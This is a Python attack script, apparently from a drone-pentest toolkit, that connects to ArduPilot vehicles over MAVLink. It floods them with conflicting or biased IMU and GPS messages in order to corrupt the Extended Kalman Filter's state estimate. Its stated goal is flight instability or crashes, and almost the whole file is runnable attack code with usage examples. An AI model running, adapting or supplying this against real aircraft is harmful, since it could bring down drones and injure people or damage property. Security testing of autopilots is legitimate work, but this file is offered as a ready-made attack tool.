#!/usr/bin/env python3
"""
EKF (Extended Kalman Filter) Spoofing
Spoof EKF sensor fusion data to cause incorrect state estimation

Exploits the Extended Kalman Filter used in ArduPilot to cause
incorrect state estimation, leading to flight instability or crashes.

CVSS Score: 6.5 (Medium)
Affected: ArduPilot-based drones with EKF enabled
"""

import sys
import time
from pymavlink import mavutil

def spoof_ekf(connection_string, spoof_type='sensor_data'):
    """
    Spoof Extended Kalman Filter sensor fusion
    
    Args:
        connection_string: MAVLink connection string
        spoof_type: Type of spoofing ('sensor_data', 'covariance', 'bias')
    """
    try:
        print("[*] EKF Spoofing Attack")
        print(f"[*] Spoof type: {spoof_type}")
        print(f"[*] Connecting to {connection_string}...")
        
        # Use helper function for connection
        import sys
        from pathlib import Path
        sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
        from mavlink_helper import connect_to_drone
        
        master = connect_to_drone(connection_string, timeout=5)
        if master is None:
            return False
        print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        # Check autopilot type
        msg = master.recv_match(type='HEARTBEAT', blocking=True, timeout=2)
        if msg:
            autopilot = msg.autopilot
            if autopilot != 3:  # ArduPilot
                print("[!] Target is not ArduPilot - EKF spoofing may not be applicable")
        
        print("[*] Spoofing EKF sensor fusion...")
        
        if spoof_type == 'sensor_data':
            spoof_sensor_data(master, target_system, target_component)
        elif spoof_type == 'covariance':
            spoof_covariance(master, target_system, target_component)
        elif spoof_type == 'bias':
            spoof_sensor_bias(master, target_system, target_component)
        else:
            print(f"[-] Unknown spoof type: {spoof_type}")
            return False
        
        print("[+] EKF spoofing completed")
        return True
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return False

def spoof_sensor_data(master, target_system, target_component):
    """Spoof sensor data fed to EKF"""
    print("[*] Spoofing sensor data...")
    
    # Inject conflicting sensor readings
    print("[*] Injecting conflicting IMU, GPS, and magnetometer data...")
    
    for i in range(50):
        # Conflicting IMU data
        master.mav.raw_imu_send(
            0,  # Time usec
            i * 1000,  # X accel (increasing, unrealistic)
            -i * 1000,  # Y accel (decreasing, conflicting)
            i * 500,  # Z accel
            i * 100,  # X gyro
            -i * 100,  # Y gyro
            i * 50,  # Z gyro
            100 + i,  # X mag
            200 + i,  # Y mag
            300 + i   # Z mag
        )
        
        # Conflicting GPS data
        master.mav.gps_raw_int_send(
            0,
            3,  # Fix type
            int((37.7749 + (i * 0.0001)) * 1e7),
            int((-122.4194 - (i * 0.0001)) * 1e7),
            100000 + (i * 1000),
            65535, 65535, 65535, 65535, 65535, 65535
        )
        
        time.sleep(0.1)
    
    print("[+] Sensor data spoofed")

def spoof_covariance(master, target_system, target_component):
    """Spoof EKF covariance matrix"""
    print("[*] Spoofing EKF covariance...")
    print("[*] Injecting data to corrupt covariance estimation...")
    
    # Send sensor data with incorrect uncertainty
    for i in range(30):
        master.mav.raw_imu_send(
            0,
            (i % 10) * 2000,  # Oscillating acceleration
            -(i % 10) * 2000,
            (i % 10) * 1000,
            0, 0, 0, 0, 0, 0
        )
        time.sleep(0.1)
    print("[+] Covariance spoofing attempted")

def spoof_sensor_bias(master, target_system, target_component):
    """Spoof sensor bias estimation"""
    print("[*] Spoofing sensor bias estimation...")
    print("[*] Injecting data to corrupt bias estimation...")
    
    # Send biased sensor data
    for i in range(40):
        # IMU with constant bias
        master.mav.raw_imu_send(
            0,
            5000,  # Constant X accel bias
            -5000,  # Constant Y accel bias
            2500,  # Constant Z accel bias
            500,  # Constant X gyro bias
            -500,  # Constant Y gyro bias
            250,  # Constant Z gyro bias
            0, 0, 0
        )
        time.sleep(0.1)
    print("[+] Sensor bias spoofing attempted")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ekf_spoofing.py <connection> [spoof_type]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  spoof_type    Type: sensor_data, covariance, bias (default: sensor_data)")
        print("\nExamples:")
        print("  python3 ekf_spoofing.py udp:127.0.0.1:14550")
        print("  python3 ekf_spoofing.py udp:127.0.0.1:14550 covariance")
        print("\nEKF Spoofing")
        print("CVSS Score: 6.5 (Medium)")
        print("Affected: ArduPilot-based drones with EKF enabled")
        sys.exit(1)
    
    connection = sys.argv[1]
    spoof_type = sys.argv[2] if len(sys.argv) > 2 else 'sensor_data'
    
    spoof_ekf(connection, spoof_type)

if __name__ == "__main__":
    main()
